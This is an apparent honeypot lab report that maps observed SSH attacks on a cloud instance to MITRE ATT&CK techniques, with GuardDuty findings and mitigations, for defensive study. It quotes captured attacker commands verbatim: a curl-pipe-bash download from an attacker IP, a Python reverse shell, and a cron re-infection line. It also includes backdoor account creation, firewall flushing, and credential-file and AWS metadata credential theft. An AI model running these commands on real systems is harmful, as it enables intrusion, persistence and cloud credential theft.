# MITRE ATT&CK Framework Mapping
## Cloud Honeypot Detection Lab — Observed TTPs

> This document maps all observed attacker behaviors to the [MITRE ATT&CK® Enterprise Framework](https://attack.mitre.org/) and the [Cloud Matrix](https://attack.mitre.org/matrices/enterprise/cloud/).

---

## Coverage Heatmap

| Tactic | # Techniques | Observations |
|--------|-------------|--------------|
| Reconnaissance | 2 | Port scanning, service enumeration |
| Initial Access | 2 | Brute force, valid accounts |
| Execution | 4 | Shell commands, scripts, Python |
| Persistence | 3 | Cron, accounts, SSH keys |
| Privilege Escalation | 1 | Sudo abuse attempt |
| Defense Evasion | 2 | Firewall disable, file deletion |
| Credential Access | 3 | Files, IMDS, brute force |
| Discovery | 5 | System, network, user, process, file |
| Lateral Movement | 1 | Internal network scan |
| Collection | 1 | Credential file harvesting |
| Command & Control | 3 | HTTP, reverse shell, encrypted channel |
| Exfiltration | 1 | C2 channel |
| Impact | 2 | Resource hijacking, defacement |

---

## Detailed TTP Mapping

### RECONNAISSANCE

#### T1595 — Active Scanning
- **Sub-technique:** T1595.001 (Scanning IP Blocks), T1595.002 (Vulnerability Scanning)
- **Observed behavior:** IP ranges probed in sequential order from automated scanners (Shodan, Censys); 456 hits on database ports (MySQL, PostgreSQL, Redis, MongoDB)
- **Source IPs:** 162.142.125.210 (Shodan), 167.248.133.190 (Shodan)
- **Evidence:** GuardDuty finding `Recon:EC2/PortProbeUnprotectedPort`

#### T1592 — Gather Victim Host Information
- **Observed behavior:** Automated HTTP requests to detect server banners, SSH version fingerprinting (response to SSH version string `SSH-2.0-OpenSSH_8.2p1 Ubuntu`)
- **Evidence:** Cowrie `cowrie.session.connect` events with immediate disconnection (version check without login attempt)

---

### INITIAL ACCESS

#### T1110 — Brute Force
- **Sub-techniques:** T1110.001 (Password Guessing), T1110.003 (Password Spraying)
- **Observed behavior:** 11,234 automated SSH login attempts using credential wordlists
- **Top credentials attempted:** `root:123456`, `admin:admin`, `ubuntu:ubuntu@123`, `root:toor`, `admin:P@ssw0rd`
- **Attacker tools:** Hydra, Medusa, Metasploit (inferred from timing patterns)
- **Source IPs:** 185.220.101.47, 194.165.16.98, 77.88.55.80, 162.142.125.210
- **GuardDuty:** `UnauthorizedAccess:EC2/SSHBruteForce`

#### T1078 — Valid Accounts
- **Sub-technique:** T1078.003 (Local Accounts)
- **Observed behavior:** 89 successful authentications using weak/default credentials
- **Successfully used credentials:**
  - `admin:admin123` (185.220.101.47)
  - `ubuntu:ubuntu@123` (91.92.251.103)
  - `root:toor` (5.188.206.26)
  - `admin:P@ssw0rd` (218.92.0.195)
  - `user:user` (80.94.95.130)
  - `ec2-user:ec2-user` (45.227.255.190)

---

### EXECUTION

#### T1059.004 — Command and Scripting Interpreter: Unix Shell
- **Observed behavior:** Attackers used `/bin/sh` and `/bin/bash` to execute downloaded scripts
- **Example commands:**
  ```bash
  curl -s http://45.155.205.233/bot.sh | bash
  chmod +x /tmp/.update && /tmp/.update
  ```
- **Source IPs:** 91.92.251.103, 185.220.101.47

#### T1059.006 — Command and Scripting Interpreter: Python
- **Observed behavior:** Python used to launch reverse shell
- **Observed payload:**
  ```python
  python3 -c "import socket,subprocess,os;
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  s.connect(('218.92.0.195',4444));
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
  p=subprocess.call(['/bin/sh','-i']);"
  ```
- **Source IP:** 218.92.0.195
- **GuardDuty:** `Backdoor:EC2/C&CActivity.B`

#### T1105 — Ingress Tool Transfer
- **Observed behavior:** Attackers downloaded additional tools/payloads using `wget` and `curl`
- **Observed URLs:**
  - `http://193.32.162.157/x86` (Mirai botnet binary)
  - `http://45.227.255.190/xmrig` (XMRig cryptominer)
  - `http://45.155.205.233/bot.sh` (Botnet installer)

#### T1204 — User Execution
- **Sub-technique:** T1204.002 (Malicious File)
- **Observed behavior:** Manual execution of downloaded malware after `chmod +x`
- **Pattern:** Download → make executable → execute → establish persistence

---

### PERSISTENCE

#### T1053.003 — Scheduled Task/Job: Cron
- **Observed behavior:** Cron persistence entry added to `/etc/crontab`:
  ```bash
  echo '*/5 * * * * root wget -q -O- http://5.188.206.26/update.sh | bash' >> /etc/crontab
  ```
- **Source IP:** 5.188.206.26
- **Severity:** CRITICAL — establishes persistent re-infection every 5 minutes

#### T1136.001 — Create Account: Local Account
- **Observed behavior:** New user account created with sudo privileges:
  ```bash
  useradd -m -s /bin/bash -G sudo backdoor_user
  ```
- **Source IP:** 5.188.206.26
- **GuardDuty:** `UnauthorizedAccess:EC2/TorIPCaller` (Severity 9.0)

#### T1098 — Account Manipulation
- **Observed behavior:** Potential SSH authorized_keys modification (commands truncated by session timeout in honeypot)

---

### DEFENSE EVASION

#### T1562.004 — Impair Defenses: Disable or Modify System Firewall
- **Observed behavior:** iptables rules flushed to allow outbound C2 connections:
  ```bash
  iptables -F
  ```
- **Source IP:** 218.92.0.195

#### T1070.004 — Indicator Removal: File Deletion
- **Observed behavior:** Malware binaries executed from `/tmp` and deleted after launch (common in Mirai variants)
- **Pattern:** `/tmp/.update` executed then file removed

---

### CREDENTIAL ACCESS

#### T1110.001 — Brute Force: Password Guessing
- *(See Initial Access T1110 above)*

#### T1552.001 — Unsecured Credentials: Credentials In Files
- **Observed behavior:** Active searching for credential files:
  ```bash
  find / -name '*.pem' -o -name '*.key' 2>/dev/null
  cat ~/.aws/credentials 2>/dev/null
  ```
- **Source IP:** 80.94.95.130

#### T1552.005 — Unsecured Credentials: Cloud Instance Metadata API
- **Observed behavior:** Direct query to AWS IMDS for IAM credentials:
  ```bash
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```
- **Source IP:** 80.94.95.130
- **Significance:** This is a **cloud-specific attack** targeting AWS IAM role credentials to pivot to the cloud control plane
- **GuardDuty:** `UnauthorizedAccess:EC2/MetadataIMDSv1Used` (Severity 9.5)
- **Mitigation:** Enforce IMDSv2 (requires session token, prevents SSRF-based metadata theft)

---

### DISCOVERY

#### T1082 — System Information Discovery
- **Commands:** `uname -a`, `cat /etc/issue`, `cat /proc/cpuinfo | grep processor | wc -l`
- **Purpose:** Identify OS version, kernel, CPU architecture for malware targeting

#### T1033 — System Owner/User Discovery
- **Commands:** `id`, `whoami`, `cat /etc/passwd`
- **Purpose:** Confirm privilege level and enumerate other user accounts

#### T1057 — Process Discovery
- **Commands:** `ps aux`
- **Purpose:** Look for competing malware, security tools, monitoring agents

#### T1049 — System Network Connections Discovery
- **Commands:** `netstat -tulnp`
- **Purpose:** Map open ports, find listening services to attack laterally

#### T1083 — File and Directory Discovery
- **Commands:** `ls -la /`, `find /`, `ls /etc/cron*`
- **Purpose:** Enumerate filesystem structure, find configuration files

#### T1046 — Network Service Discovery
- **Observed behavior:** Port scan of internal VPC CIDR block
- **Target ports:** 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 27017 (MongoDB)
- **Implication:** Attacker attempting to identify vulnerable database services for lateral movement

---

### LATERAL MOVEMENT

#### T1021.004 — Remote Services: SSH
- **Observed behavior:** After initial compromise, attacker checked network topology; in a real environment, this precedes SSH connections to other internal hosts
- **Mitigation:** SSH key-based auth only; disable password auth; use Security Groups to restrict inter-host SSH

---

### 🔗 COMMAND AND CONTROL

#### T1071.001 — Application Layer Protocol: Web Protocols
- **Observed behavior:** HTTP-based C2 communication via `wget`/`curl` pulling scripts from attacker infrastructure

#### T1059.006 — Python Reverse Shell
- *(See Execution section above)*
- **Port used:** 4444 (common Metasploit default)

#### T1496 — Resource Hijacking (C2 as side channel)
- **XMRig communicates with mining pool over HTTPS (port 443)** — blends with legitimate web traffic to evade detection

---

### IMPACT

#### T1496 — Resource Hijacking
- **Observed behavior:** XMRig Monero cryptominer deployed on EC2 instance
- **Mining pool:** `stratum+tcp://pool.minexmr.com:443`
- **Business impact:** On real EC2, this would result in:
  - CPU utilization spike to 99%
  - Unexpected EC2 billing charges (t2.micro → CPU credits exhausted)
  - Degraded application performance
- **GuardDuty:** `CryptoCurrency:EC2/BitcoinTool.B` (Severity 8.5)

#### T1485 — Data Destruction (Attempted)
- **Observed behavior:** `iptables -F` removes firewall rules, removing last line of defense before potential destructive action

---

## Cloud-Specific Techniques (AWS Cloud Matrix)

| Technique | ID | Observed |
|-----------|-----|---------|
| Steal Application Access Token | T1528 | IMDS IAM credential theft |
| Modify Cloud Compute Infrastructure | T1578 | Persistence via cron (would affect cloud VM) |
| Account Manipulation | T1098 | Backdoor account creation |
| Resource Hijacking | T1496 | Cryptominer on EC2 |
| Cloud Instance Metadata API | T1552.005 | Direct IMDS query |

---

## ATT&CK Navigator Layer (JSON)

Save this as `mitre_layer.json` and import at https://mitre-attack.github.io/attack-navigator/

```json
{
  "version": "4.5",
  "name": "Cloud Honeypot Detected TTPs",
  "description": "TTPs observed during 72-hour honeypot observation",
  "domain": "enterprise-attack",
  "techniques": [
    {"techniqueID": "T1595", "score": 3, "color": "#ff6666"},
    {"techniqueID": "T1110", "score": 5, "color": "#ff0000"},
    {"techniqueID": "T1078", "score": 4, "color": "#ff3300"},
    {"techniqueID": "T1059.004", "score": 4, "color": "#ff6600"},
    {"techniqueID": "T1059.006", "score": 3, "color": "#ff6600"},
    {"techniqueID": "T1105", "score": 4, "color": "#ff9900"},
    {"techniqueID": "T1053.003", "score": 2, "color": "#cc0000"},
    {"techniqueID": "T1136.001", "score": 2, "color": "#cc0000"},
    {"techniqueID": "T1562.004", "score": 2, "color": "#9900cc"},
    {"techniqueID": "T1552.001", "score": 3, "color": "#ff3366"},
    {"techniqueID": "T1552.005", "score": 3, "color": "#ff0066"},
    {"techniqueID": "T1082", "score": 5, "color": "#3366ff"},
    {"techniqueID": "T1033", "score": 5, "color": "#3366ff"},
    {"techniqueID": "T1057", "score": 3, "color": "#3399ff"},
    {"techniqueID": "T1046", "score": 2, "color": "#3366ff"},
    {"techniqueID": "T1083", "score": 4, "color": "#66aaff"},
    {"techniqueID": "T1496", "score": 3, "color": "#ff0000"},
    {"techniqueID": "T1071.001", "score": 3, "color": "#ff6633"}
  ]
}
```
